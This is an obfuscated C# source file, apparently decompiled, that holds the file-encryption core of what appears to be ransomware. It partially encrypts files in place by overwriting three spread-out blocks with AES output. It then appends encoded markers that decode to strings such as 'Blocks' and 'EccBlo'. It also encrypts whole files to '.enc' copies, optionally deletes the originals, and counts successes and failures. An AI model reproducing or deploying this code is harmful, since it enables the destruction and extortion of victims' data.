using System;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using SbziaiYStR;

namespace YzTymtbtgFABHvJvj;

internal class edRtLMSZmnqkqI
{
	public const int oZqCxiudtC = 256;

	public static void PpQvtkpBCukIOH(string dZDBNMnERQX, int WikMpaxeRNl)
	{
		FileInfo fileInfo = new FileInfo(dZDBNMnERQX);
		FileStream fileStream = fileInfo.Open(FileMode.Open);
		fileStream.SetLength(Math.Max(0L, fileInfo.Length - WikMpaxeRNl));
		fileStream.Close();
	}

	public static int ZtygPZyVvEoR(long QVVSZaPIWPuLxNjY)
	{
		return (int)QVVSZaPIWPuLxNjY;
	}

	public static bool eIzMNjltVFURhx(string rOkhWFzAXGCiT, string qrlduMuCmpxMBjOH, string uLFXdZwtMLw, byte[] ivmfLNQVTyh = null, byte[] VsOBqiJOXx = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(rOkhWFzAXGCiT, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = ZtygPZyVvEoR(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(qrlduMuCmpxMBjOH) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(qrlduMuCmpxMBjOH) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(qrlduMuCmpxMBjOH) * 1024 * 1024) / 10;
				}
				int tzlFMRKDbbRU = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] array2 = tFHbxtfsouveRbhf(rOkhWFzAXGCiT, fileStream, tzlFMRKDbbRU, num * i);
					array = (eqCksjvMyn.BnBkXlAwDSWJ ? vrURVOQkkFzVFw.ZlRyaqmLMIOjEX(array2, Convert.FromBase64String(uLFXdZwtMLw), VsOBqiJOXx) : LPxPUxFbwbiz.DJqnxaACLqbwV(array2, Convert.FromBase64String(uLFXdZwtMLw), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					stadEKYWHjyIUp(rOkhWFzAXGCiT, fileStream, array, num * i);
				}
			}
			byte[] array3 = null;
			array3 = ((!eqCksjvMyn.zzEQfIIuvgiBbM) ? (eqCksjvMyn.IUeXbBJIfNgWuv ? Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni("RWNjQmxv") + eqCksjvMyn.joRKfFeYni("LQ==") + Convert.ToString(qrlduMuCmpxMBjOH) + eqCksjvMyn.joRKfFeYni("LQ==")) : Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni("QmxvY2tz") + eqCksjvMyn.joRKfFeYni("LQ==") + Convert.ToString(qrlduMuCmpxMBjOH) + eqCksjvMyn.joRKfFeYni("LQ=="))) : (eqCksjvMyn.IUeXbBJIfNgWuv ? Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni("VWJsb2NF") + eqCksjvMyn.joRKfFeYni("Kw==") + Convert.ToString(qrlduMuCmpxMBjOH) + eqCksjvMyn.joRKfFeYni("Kw==")) : Encoding.ASCII.GetBytes(eqCksjvMyn.joRKfFeYni("QmxvY2tz") + eqCksjvMyn.joRKfFeYni("Kw==") + Convert.ToString(qrlduMuCmpxMBjOH) + eqCksjvMyn.joRKfFeYni("Kw=="))));
			if (!eqCksjvMyn.zzEQfIIuvgiBbM)
			{
				using FileStream fileStream2 = new FileStream(rOkhWFzAXGCiT, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array3, 0, array3.Length);
			}
			else
			{
				using FileStream fileStream2 = new FileStream(rOkhWFzAXGCiT, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(ivmfLNQVTyh, 0, ivmfLNQVTyh.Length);
				fileStream2.Write(array3, 0, array3.Length);
			}
		}
		catch (Exception ex)
		{
			if (eqCksjvMyn.nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(eqCksjvMyn.zRTqZqtXid, "File: " + rOkhWFzAXGCiT + " - Error creating filestream for block process or read-write: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			eqCksjvMyn.ZmTUAzYynatCYr++;
			return false;
		}
		eqCksjvMyn.UrQRBEHxUHKK++;
		return true;
	}

	public static string eTrfVKpHfLeqk(string VsCxhwxPwPJuxy)
	{
		byte[] bytes = Convert.FromBase64String(VsCxhwxPwPJuxy);
		return Encoding.UTF8.GetString(bytes);
	}

	public static byte[] IYWaHCUIMdZrnrRl(int HxIlzzLzvyPO)
	{
		byte[] array = new byte[HxIlzzLzvyPO];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool nfuRbKHRXDXzg(string fONnVedKldwMAn, byte[] RoYGfqaGfX, bool qwziXGjWfm)
	{
		byte[] array = IYWaHCUIMdZrnrRl(16);
		using FileStream fileStream = new FileStream(fONnVedKldwMAn + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = SaReXNOgEYpqd(RoYGfqaGfX, array);
		RoYGfqaGfX = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(fONnVedKldwMAn, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (qwziXGjWfm)
			{
				File.Delete(fONnVedKldwMAn);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool ydJavRUcnTXJ(string XfqcTmsKBUcG, byte[] HXDLxYNRqOjAAC, bool mQanRoHUMw)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(XfqcTmsKBUcG, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = SaReXNOgEYpqd(HXDLxYNRqOjAAC, array);
		HXDLxYNRqOjAAC = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(XfqcTmsKBUcG.Remove(XfqcTmsKBUcG.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] cubASJNAJa(byte[] vQWtSXMTBPlrNVi, byte[] KxvXuOKQHSwj, byte[] ikmlFpuFJoKcK)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = SaReXNOgEYpqd(KxvXuOKQHSwj, ikmlFpuFJoKcK);
		KxvXuOKQHSwj = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(vQWtSXMTBPlrNVi, 0, vQWtSXMTBPlrNVi.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static byte[] vpOzbsbnZxBJ(byte[] iFFLzdFnZmVzou, byte[] KmjQzPfxmJX, byte[] jedDFXbUqoYdIuc)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = SaReXNOgEYpqd(KmjQzPfxmJX, jedDFXbUqoYdIuc);
		KmjQzPfxmJX = null;
		GC.Collect();
		using (Aes aes = new AesManaged())
		{
			aes.KeySize = 256;
			aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
			aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
			aes.Padding = PaddingMode.None;
			aes.Mode = CipherMode.CBC;
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(iFFLzdFnZmVzou, 0, iFFLzdFnZmVzou.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			rfc2898DeriveBytes.Dispose();
		}
		return result;
	}

	public static bool RJltanVWmPNT(byte[] lGgJCFRoPLLh, byte[] USWoIZwRnwjYC, byte[] DOysfNQKfTemj)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = SaReXNOgEYpqd(lGgJCFRoPLLh, USWoIZwRnwjYC);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(DOysfNQKfTemj);
	}

	public static Rfc2898DeriveBytes SaReXNOgEYpqd(byte[] SxSjVXooVmLMZD, byte[] ABTNSBhste)
	{
		return new Rfc2898DeriveBytes(SxSjVXooVmLMZD, ABTNSBhste, 52768);
	}

	public static byte[] tFHbxtfsouveRbhf(string AHLxedstAZH, FileStream qKmoFNYFGPZPW, int TzlFMRKDbbRU, int uqWAXDIMUhHn = 0)
	{
		byte[] array = new byte[TzlFMRKDbbRU];
		qKmoFNYFGPZPW.Position = uqWAXDIMUhHn;
		qKmoFNYFGPZPW.Read(array, 0, TzlFMRKDbbRU);
		return array;
	}

	public static void stadEKYWHjyIUp(string cfKzdBtlyhl, FileStream odnfvcNZpddm, byte[] gQZQzSZMcRNR, int uyOOPjlxSmos = 0)
	{
		odnfvcNZpddm.Position = uyOOPjlxSmos;
		odnfvcNZpddm.Write(gQZQzSZMcRNR, 0, gQZQzSZMcRNR.Length);
	}
}
